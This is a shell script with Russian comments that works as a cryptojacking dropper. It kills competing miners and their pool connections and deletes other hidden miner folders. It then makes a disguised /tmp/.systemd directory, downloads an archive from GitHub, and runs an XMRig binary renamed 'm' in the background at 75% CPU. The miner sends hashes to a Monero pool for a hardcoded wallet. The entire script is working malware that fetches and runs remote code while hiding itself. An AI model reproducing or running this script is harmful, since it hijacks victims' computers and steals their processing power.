#!/bin/sh
# Универсальный скрипт для всех систем (даже без bash/wget)

# Функция для определения доступного загрузчика
get_downloader() {
    if command -v wget >/dev/null 2>&1; then
        echo "wget -qO-"
    elif command -v curl >/dev/null 2>&1; then
        echo "curl -s"
    else
        echo "Error: Neither wget nor curl is installed" >&2
        exit 1
    fi
}

DOWNLOADER=$(get_downloader)

# Принудительное завершение процессов (работает без bash)
killall_processes() {
    for proc in nohup xmrig miner cpuminer xmr-stak systemd-service systemf monero; do
        pkill -9 -f "$proc" 2>/dev/null || killall -9 "$proc" 2>/dev/null || true
    done
    
    # Популярные пулы
    for pool in pool.hashvault.pro moneroocean.stream gulf.moneroocean.stream supportxmr.com nanopool.org minexmr.com xmrig.com xmrig.cc pool.minexmr.com xmrpool.eu moneropool.com pool.4i77.com pool.usxmrpool.com xmrpool.net fairhash.org monero.crypto-pool.fr sumominer.com monero.hashvault.pro backup-pool.com moriaxmr.com bohemianpool.com mine.xmrpool.net pool.xmr.pt; do
        pkill -9 -f "$pool" 2>/dev/null || true
    done
}

# Генерация случайного имени (работает без /dev/urandom)
generate_worker_name() {
    if [ -f /dev/urandom ]; then
        WORKER_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    else
        WORKER_NAME=$(date +%s | sha256sum | base64 | head -c 8 2>/dev/null || echo "worker$(date +%s | cut -c9-12)")
    fi
    echo "$WORKER_NAME"
}

# Основная логика
killall_processes

# Чистка скрытых мест
for path in /tmp/.systemd /tmp/.systemd/m /dev/shm/.systemd /dev/shm/.systemd/m ./.cache hwloc-without-main main.zip; do
    rm -rf "$path" 2>/dev/null || true
done

# Поиск подозрительных файлов
for loc in /tmp /dev/shm; do
    find "$loc" -name '.systemd' -type d -exec rm -rf {} \; 2>/dev/null || true
    find "$loc" -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true
    find "$loc" -name '.cache' -type d -exec rm -rf {} \; 2>/dev/null || true
done

# Генерация имени воркера
WORKER_NAME=$(generate_worker_name)

# Создаем скрытую папку в /tmp
HIDDEN_DIR="/tmp/.systemd"
mkdir -p "$HIDDEN_DIR" 2>/dev/null || {
    # Если не удалось создать в /tmp, пробуем альтернативные места
    HIDDEN_DIR="$(mktemp -d 2>/dev/null || mktemp -d -t '.systemd' 2>/dev/null || echo '/tmp/.systemd')"
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || exit 1
}

# Скачивание и запуск в скрытой папке
cd "$HIDDEN_DIR" || exit 1

$DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
if [ $? -ne 0 ]; then
    echo "[-] ERROR: Failed to download miner archive"
    exit 1
fi

unzip -o main.zip >/dev/null 2>&1 || {
    echo "[-] WARNING: unzip failed, trying with busybox"
    busybox unzip -o main.zip 2>/dev/null || exit 1
}

cd hwloc-without-main || exit 1

chmod +x xmrig 2>/dev/null || true
mv xmrig m

nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
PID=$!
